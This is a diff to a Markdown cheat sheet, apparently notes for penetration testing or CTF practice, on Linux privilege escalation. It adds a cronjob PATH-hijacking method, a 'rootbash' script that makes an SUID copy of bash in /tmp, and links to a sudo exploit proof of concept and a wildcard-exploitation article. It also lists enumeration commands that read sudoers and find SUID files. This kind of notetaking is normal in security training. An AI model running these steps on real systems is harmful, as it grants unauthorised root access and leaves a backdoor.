@@ -18,8 +18,8 @@ run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with incr
 [gtfobins](https://gtfobins.github.io/) 
 - [ ] Fully functional tty? 
 - [ ] su root? (no password, root, password) 
-- [ ] Sudo binaries or exploits? (sudo -l, cat /etc/sudoers - check gtfobins)
-- [ ] Exploitable cronjobs? 
+- [ ] Sudo binaries or exploits? 
+- [ ] Exploitable cronjobs?
 - [ ] Weird SUID binaries?   
 - [ ] Services running as root?, services only available to localhost?
 - [ ] Passwords / config files?  
@@ -36,6 +36,7 @@ run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with incr
     /bin/sh -i 
     /bin/bash -p 
 ## Sudo exploits 
+sudo -l, cat /etc/sudoers, check gtfobins 
 sudo -V 
 ## Sudo LD_PRELOAD 
 sudo -l, see env_keep+=LD_PRELOAD 
@@ -62,11 +63,23 @@ sudo su root, type password, see ******: passwd feedback enabled
 ## CVE-2021-3156 - Baron Samedit 
 [proof of concept](https://github.com/stong/CVE-2021-3156) 
 ## Cronjobs    
-look for scripts you can write to or exploit  
+look for scripts you can write to running as a cronjob, writeable PATH enviromental variable, wildcard expansion
 
     cat /etc/crontab  
     crontab -l    
     ls -al /etc/cron* 
+## PATH variable 
+If a cronjob doesn’t use an absolute path and one of path dirs is writable by user: can create a script with the same name as the cron job so it executes. 
+default /usr/bin:/bin 
+    echo $PATH 
+    cat /etc/crontab     
+### Rootbash script 
+    #!/bin/bash 
+    cp /bin/bash /tmp/rootbash 
+    chmod +s /tmp/rootbash 
+### Wildcards 
+[Exploiting wildcards in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) 
+
 ## SUID Binaries
     find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null                                 
 ### Custom Executable
